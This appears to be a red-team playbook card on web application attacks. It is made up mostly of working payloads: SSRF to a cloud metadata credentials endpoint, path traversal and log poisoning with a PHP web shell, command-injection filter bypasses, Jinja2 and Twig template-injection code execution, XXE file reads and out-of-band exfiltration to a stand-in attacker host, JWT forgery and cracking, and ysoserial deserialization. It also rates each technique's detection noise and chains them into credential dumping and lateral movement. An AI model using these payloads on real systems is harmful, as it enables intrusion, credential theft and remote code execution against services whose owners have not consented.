# Web Application Attacks

tags: web, ssrf, lfi, rfi, command-injection, ssti, xxe, jwt, deserialization, rce

## Objective
Exploit common web application vulnerabilities: SSRF, LFI, command injection, SSTI, XXE, JWT attacks, and deserialization.

## Prerequisites
- Web application identified with potential vulnerability classes
- Understanding of the application's technology stack

## Methodology

### SSRF (Server-Side Request Forgery)
```bash
# AWS metadata endpoint (OPSEC: 0.2 from app context)
http://169.254.169.254/latest/meta-data/iam/security-credentials/

# Bypass filters
# Decimal IP: 2130706433 (127.0.0.1)
# IPv6: [::ffff:127.0.0.1]
# DNS rebinding, URL encoding, 307 redirects
```

### LFI (Local File Inclusion)
```bash
# Basic traversal
../../../../etc/passwd

# PHP source code read via filter
php://filter/convert.base64-encode/resource=config.php

# Log poisoning — inject PHP via User-Agent, then include log
# 1. Send request with User-Agent: <?php system($_GET['cmd']); ?>
# 2. Include: /var/log/apache2/access.log&cmd=id
```

### Command Injection
```bash
# Basic injection operators
; whoami
| whoami
$(whoami)
`whoami`

# Bypass filters
${IFS}              # space replacement
{cat,/etc/passwd}   # brace expansion
c'a't /etc/passwd   # quote splitting
```

### SSTI (Server-Side Template Injection)
```bash
# Detection: {{7*7}} → 49 confirms SSTI

# Jinja2 RCE
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}

# Twig RCE
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
```

### XXE (XML External Entity)
```xml
<!-- Basic file read -->
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root>

<!-- Blind XXE with OOB exfiltration — use external DTD -->
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://ATTACKER/evil.dtd">%xxe;]>
```

### JWT Attacks
```bash
# Algorithm "none" attack
jwt_tool.py TOKEN -X a

# Key confusion (HS256/RS256)
jwt_tool.py TOKEN -X k -pk public.pem

# Crack HS256 secret
hashcat -m 16500 jwt.txt wordlist
```

### Deserialization
```bash
# Java — detect: AC ED 00 05 (hex) or rO0 (base64)
java -jar ysoserial.jar CommonsCollections4 'command' | base64

# PHP — detect: O:4:"User" serialized objects
# Python — detect: pickle, yaml.load
```

## Graph Reporting
- **Credential nodes**: from extracted config files, metadata endpoints
- **HAS_SESSION edges**: if RCE achieved
- **Service node enrichment**: vulnerability type, technology details
- **Host node enrichment**: OS info from command execution

## OPSEC Notes

| Technique | Noise Rating |
|-----------|-------------|
| SSRF | 0.3 |
| LFI | 0.4 |
| Command injection | 0.5 |
| SSTI | 0.5 |
| XXE | 0.4 |
| JWT manipulation | 0.2 |
| Deserialization | 0.6 |

**Detection**: WAF signatures, unusual file access patterns, outbound connections from web server (SSRF/XXE OOB), command execution logs.

## Sequencing
- **After**: Web Reconnaissance, Web Vulnerability Scanning
- **Feeds →**: Credential Dumping (from config files), Lateral Movement (from RCE), Cloud Exploitation (SSRF to metadata)
